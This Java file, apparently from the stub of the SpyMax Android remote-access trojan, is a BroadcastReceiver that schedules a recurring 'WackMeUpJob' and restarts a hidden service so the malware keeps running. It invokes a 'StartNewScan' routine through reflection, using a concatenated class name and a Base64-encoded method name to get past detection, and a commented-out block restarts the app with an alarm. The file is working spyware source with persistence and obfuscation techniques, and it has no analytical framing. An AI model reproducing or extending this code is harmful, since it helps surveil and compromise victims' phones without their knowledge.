package spymax.stub7;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class ClassGen1 extends BroadcastReceiver {

    public static void scheduleJob(Context context) {
        JobScheduler jobScheduler = (JobScheduler)context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        ComponentName serviceName = new ComponentName(context, WackMeUpJob.class);
        JobInfo jobInfo;
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){

            jobInfo = new JobInfo.Builder(100, serviceName)
                    .setPeriodic(900000)
                    .build();
        }else{
            jobInfo = new JobInfo.Builder(100, serviceName)
                    .setPeriodic(15000)
                    .build();
        }
        jobScheduler.schedule(jobInfo);
    }
//    private void restartApp( Context mContext) {
//        try {
//            long restartTime = 1000*5;
//            Intent intents = mContext.getPackageManager().getLaunchIntentForPackage(mContext.getPackageName());
//            PendingIntent restartIntent = PendingIntent.getActivity(mContext, 0, intents, PendingIntent.FLAG_ONE_SHOT);
//            AlarmManager mgr = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
//
//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
//                mgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + restartTime, restartIntent);
//
//            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
//                mgr.setExact(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + restartTime, restartIntent);
//            }
//        } catch (Exception e) {
//          //  Log.e(TAG, e.getMessage());
//        }
//    }
    @Override
    public void onReceive(Context x, Intent intent) {
       // if (e != null){

             try{
//                 if (ClassGen11.app_ClassGen11_Context== null)
//                 {
//                     ClassGen11.app_ClassGen11_Context = x;
//                 }
                // restartApp(x);
                 scheduleJob(x);
                 if(ClassGen10._runn_srv_(ClassGen11.class,x)) {
                     Intent i = new Intent(x, ClassGen11.class);
                     //ClassGen3.StartNewScan(x,i);

                     String funClass = "spymax"+"."+"stub7"+"."+"ClassGen3";
                     Class c = null;
                     try {
                         c = Class.forName(funClass);
                     } catch (ClassNotFoundException e) {
                         //   e.printStackTrace();
                     }


                     Object o = null;
                     try {
                         o = c.newInstance();
                     } catch (IllegalAccessException e) {
                         //  e.printStackTrace();
                     } catch (InstantiationException e) {
                         //e.printStackTrace();
                     }

                     Class[] paramTypes = new Class[2];
                     paramTypes[0]= Context.class;
                     paramTypes[1]=Intent.class;
                     String methodName = ClassGen3._D_BASE64_("U3RhcnROZXdTY2Fu");

                     Method m = null;
                     try {
                         m = c.getDeclaredMethod(methodName, paramTypes);
                     } catch (NoSuchMethodException e) {
                         //   e.printStackTrace();
                     }

                     try {
                         m.invoke(o, new Object[]{x,i});
                     } catch (IllegalAccessException e) {
                         //   e.printStackTrace();
                     } catch (InvocationTargetException e) {
                         //  e.printStackTrace();
                     }
                 }

             }catch (Exception ex){}
      //  }
    }

}